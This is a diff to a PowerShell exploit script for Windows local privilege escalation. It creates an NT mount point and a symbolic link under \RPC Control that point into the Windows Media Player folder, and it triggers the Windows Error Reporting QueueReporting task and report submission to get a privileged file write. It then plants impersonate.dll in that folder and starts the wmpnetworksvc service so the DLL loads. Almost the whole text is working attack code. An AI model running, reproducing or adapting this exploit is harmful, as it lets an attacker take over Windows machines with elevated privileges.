@@ -27,18 +27,29 @@ $linkpath = "\RPC Control"
 $target1 = "c:\windows\system32\wermgr.exe.local"
 $target2 = "C:\Program Files\Windows Media Player"
 
-[NtApiDotNet.NtFile]::CreateMountPoint("\??\$path", $linkpath, "")
+schtasks /run /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" | Out-Null
+
+Start-Sleep -s 1
+
+Remove-Item -Recurse -Force $path\Temp -ErrorAction SilentlyContinue | Out-Null
+
+Start-Sleep -s 1
+
+[NtApiDotNet.NtFile]::CreateMountPoint("\??\$path", $linkpath, $null) | Out-Null
 
 Write-Host "[+] Mount point created successfully on $linkpath"
 
-# [NtApiDotNet.NtSymbolicLink]::Create("$linkpath\temp", "\??\$target2")
+$clink = [NtApiDotNet.NtSymbolicLink]::Create("$linkpath\temp", "\??\$target2")
 
-New-NtSymbolicLink "$linkpath\temp" "\??\$target2" | Out-Null
+$clink | Out-Null
+
+# [NtApiDotNet.NtSymbolicLink]::Create("$linkpath\temp", "\??\$target2") | Out-Null
+
+# New-NtSymbolicLink "$linkpath\temp" "\??\$target2" | Out-Null
 
 Write-Host "[+] Symbolic link created successfully on $target2"
 
 #Start-Sleep -s 3
-
 
 # Type definitions taken in part from MSDN documentation as well as from
 # http://www.pinvoke.net/default.aspx/wer.WerReportSubmit and http://www.pinvoke.net/default.aspx/wer.WerReportCreate
@@ -78,6 +89,17 @@ Write-Host "[+] Symbolic link created successfully on $target2"
         else {
             Write-Host "[-] Exploit failed. Couldn't submit the report" -ForegroundColor Red   
         }
+
+# schtasks /run /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" | Out-Null
+Write-Host "test123"
+Start-Sleep -s 1
+
+[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$path") | Out-Null
+
+[NtApiDotNet.NtFile]::Delete("$linkpath\temp") | Out-Null
+
+Remove-Item -Recurse -Force $path -ErrorAction SilentlyContinue | Out-Null
+
 Copy-Item ".\impersonate.dll" -Destination "$target2\" -Force
 
 Start-Sleep -s 1
@@ -114,7 +136,7 @@ $wmpnetworksvcx = "Windows Media Player Network Sharing Service"
 
 Write-Host "[+] The Service : 'wmpnetworksvc' has been triggered !"
 
-[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$path") | Out-Null
+#[NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$path") | Out-Null
 
 Write-Host "[+] Removed Mount Point . "
 
